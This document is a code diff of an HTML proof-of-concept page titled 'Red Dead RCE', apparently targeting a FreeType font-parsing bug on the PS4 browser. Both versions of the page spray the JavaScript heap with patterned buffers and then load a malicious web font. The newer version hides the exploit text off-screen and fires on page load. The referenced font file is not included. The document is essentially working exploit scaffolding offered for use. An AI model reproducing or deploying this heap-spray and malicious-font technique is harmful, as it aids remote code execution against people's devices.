@@ -1,104 +1,87 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>Red Dead RCE – FreeType Exploit</title>
-  <style>
-    @font-face {
-      font-family: "ExploitFont";
-      src: url("mal.woff"); /* ← use mal.ttf instead of crash.otf */
-    }
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Red Dead RCE — PS4 FreeType Bug PoC</title>
 
-    body {
-      font-family: monospace;
-      background: #000;
-      color: #0f0;
-      padding: 2em;
-    }
-
-    h1 {
-      color: #0ff;
-    }
-  </style>
+<style>
+  @font-face {
+    font-family: 'MaliciousFont';
+    src: url('mal.woff') format('woff');
+    font-weight: normal;
+    font-style: normal;
+  }
+  body {
+    background-color: #000;
+    color: #0f0;
+    font-family: monospace, monospace;
+    padding: 2em;
+  }
+  #status {
+    font-size: 1.4em;
+    margin-top: 2em;
+  }
+  #hidden-text {
+    font-family: 'MaliciousFont';
+    font-size: 16px;
+    position: absolute;
+    left: -9999px;
+    top: -9999px;
+  }
+</style>
 </head>
 <body>
-  <h1>Red Dead RCE</h1>
-  <pre id="log">[!] Waiting for exploit trigger…</pre>
 
-  <script>
-    const log = (msg) => {
-      document.getElementById("log").textContent += "\n" + msg;
-    };
+<h1>Red Dead RCE — PS4 FreeType Bug PoC</h1>
 
-    const SPRAY_SIZE = 60000;
-    const SPRAY_LEN = 128;
-    const PATTERN = 0x43434343;
-    let spray = [];
+<p>Spraying heap buffers and loading malicious font...</p>
+<div id="hidden-text">Triggering FreeType parsing</div>
+<div id="status">Status: <span id="result">Waiting...</span></div>
 
-    function sprayHeap() {
-      log("[*] Spraying heap with controlled buffers…");
-      for (let i = 0; i < SPRAY_SIZE; i++) {
-        const buf = new ArrayBuffer(SPRAY_LEN * 4);
+<script>
+  const PATTERN = 0x41414141; // Pattern 'AAAA'
+  const SPRAY_CNT = 30000;    // Buffers to spray
+  const SPRAY_LEN = 32;       // Uint32 per buffer
+
+  const spray = [];
+
+  function sprayHeap() {
+    try {
+      for(let i=0; i<SPRAY_CNT; i++){
+        const buf = new ArrayBuffer(SPRAY_LEN*4);
         const u32 = new Uint32Array(buf);
-        for (let j = 0; j < SPRAY_LEN; j++) {
-          u32[j] = PATTERN;
-        }
-        spray.push(u32);
+        for(let j=0; j<u32.length; j++) u32[j] = PATTERN;
+        spray.push({u32, f64:new Float64Array(buf)});
       }
-      log("[+] Heap spray complete.");
+      document.getElementById('result').textContent = "Heap spray done, loading font...";
+      loadMaliciousFont();
+    } catch(e) {
+      document.getElementById('result').textContent = "Heap spray failed: "+e.message;
     }
+  }
 
-    function triggerFont() {
-      log("[*] Triggering FreeType with mal.ttf…");
-      const p = document.createElement("p");
-      p.style.fontFamily = "ExploitFont";
-      p.textContent = "This text uses the exploit font.";
-      document.body.appendChild(p);
-    }
-
-    function checkCorruption() {
-      log("[*] Checking for corrupted memory patterns…");
-
-      let corrupted = false;
-
-      for (let i = 0; i < spray.length; i++) {
-        const buf = spray[i];
-        for (let j = 0; j < buf.length; j++) {
-          if (buf[j] !== PATTERN) {
-            corrupted = true;
-            break;
-          }
-        }
-        if (corrupted) break;
-      }
-
-      if (corrupted) {
-        log("[✅] Exploit likely succeeded — memory corruption detected!");
-        alert("✅ Red Dead RCE: Exploit succeeded!");
+  function loadMaliciousFont() {
+    document.fonts.load('16px MaliciousFont').then(fonts => {
+      if(fonts.length > 0) {
+        document.getElementById('result').textContent = "Exploit triggered (if vulnerable)";
       } else {
-        log("[❌] No memory corruption detected.");
-        alert("❌ Red Dead RCE: Exploit likely failed.");
+        document.getElementById('result').textContent = "Exploit failed (font not loaded)";
       }
-    }
+    }).catch(e => {
+      document.getElementById('result').textContent = "Exploit failed (font load error)";
+    });
 
-    window.onload = () => {
-      try {
-        sprayHeap();
+    setTimeout(() => {
+      const hiddenText = document.getElementById('hidden-text');
+      hiddenText.style.fontWeight = 'bold';
+    }, 2000);
+  }
 
-        setTimeout(() => {
-          triggerFont();
+  sprayHeap();
+</script>
 
-          // Wait a bit for FreeType to parse & (hopefully) corrupt
-          setTimeout(() => {
-            checkCorruption();
-          }, 1000);
-
-        }, 500);
-      } catch (e) {
-        log("[!] Exception: " + e.message);
-        alert("💥 Crash: " + e.message);
-      }
-    };
-  </script>
 </body>
 </html>
+
